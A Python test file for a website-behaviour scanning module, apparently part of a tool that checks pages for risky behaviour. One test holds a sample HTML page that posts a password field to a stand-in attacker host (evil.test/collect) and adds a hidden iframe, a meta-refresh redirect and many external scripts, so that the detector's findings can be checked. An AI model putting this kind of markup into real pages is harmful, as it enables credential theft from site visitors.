
from types import SimpleNamespace

import pytest

from app.modules import website_behaviour


@pytest.fixture
def context():
    return SimpleNamespace(
        url=SimpleNamespace(normalized="https://example.com"),
        settings=SimpleNamespace(),
        http=SimpleNamespace(),
    )


async def fake_response(*args, **kwargs):
    return SimpleNamespace(
        final_url="https://example.com",
        status_code=200,
        headers={"content-type": "text/html; charset=utf-8"},
        body=b"<html><body><h1>Hello</h1></body></html>",
    )


@pytest.mark.anyio
async def test_clean_html(context, monkeypatch):
    monkeypatch.setattr(
        website_behaviour,
        "safe_fetch",
        fake_response,
    )

    result = await website_behaviour.WebsiteBehaviourModule().run(context)

    assert result.status == "completed"
    assert result.risk_score == 0
    assert result.findings == []


@pytest.mark.anyio
async def test_suspicious_behaviour_detected(context, monkeypatch):
    html = """
    <html>
      <form action="http://evil.test/collect" method="post">
        <input type="password">
      </form>
      <iframe src="https://evil.test" style="display:none"></iframe>
      <meta http-equiv="refresh" content="0;url=https://evil.test">
      <script src="https://evil.test/a.js"></script>
      <script src="https://evil.test/b.js"></script>
      <script src="https://evil.test/c.js"></script>
      <script src="https://evil.test/d.js"></script>
      <script src="https://evil.test/e.js"></script>
      <script src="https://evil.test/f.js"></script>
      <script src="https://evil.test/g.js"></script>
      <script src="https://evil.test/h.js"></script>
      <script src="https://evil.test/i.js"></script>
      <script src="https://evil.test/j.js"></script>
    </html>
    """

    async def suspicious_fetch(*args, **kwargs):
        response = await fake_response()
        response.body = html.encode()
        return response

    monkeypatch.setattr(
        website_behaviour,
        "safe_fetch",
        suspicious_fetch,
    )

    result = await website_behaviour.WebsiteBehaviourModule().run(context)

    codes = {finding.code for finding in result.findings}

    assert result.status == "completed"
    assert result.risk_score > 0
    assert "INSECURE_PASSWORD_SUBMISSION" in codes
    assert "EXTERNAL_FORM_SUBMISSION" in codes
    assert "HIDDEN_IFRAME_DETECTED" in codes
    assert "EXCESSIVE_EXTERNAL_SCRIPTS" in codes
    assert "META_REFRESH_REDIRECT" in codes


@pytest.mark.anyio
async def test_non_html_response_unavailable(context, monkeypatch):
    async def non_html_fetch(*args, **kwargs):
        return SimpleNamespace(
            final_url="https://example.com",
            status_code=200,
            headers={"content-type": "application/json"},
            body=b'{"status":"ok"}',
        )

    monkeypatch.setattr(
        website_behaviour,
        "safe_fetch",
        non_html_fetch,
    )

    result = await website_behaviour.WebsiteBehaviourModule().run(context)

    assert result.status == "unavailable"
    assert result.risk_score is None
    assert result.status_reason is not None


@pytest.mark.anyio
async def test_fetch_failure(context, monkeypatch):
    async def failed_fetch(*args, **kwargs):
        raise RuntimeError("simulated failure")

    monkeypatch.setattr(
        website_behaviour,
        "safe_fetch",
        failed_fetch,
    )

    result = await website_behaviour.WebsiteBehaviourModule().run(context)

    assert result.status == "failed"
    assert result.risk_score is None
    assert result.status_reason is not None
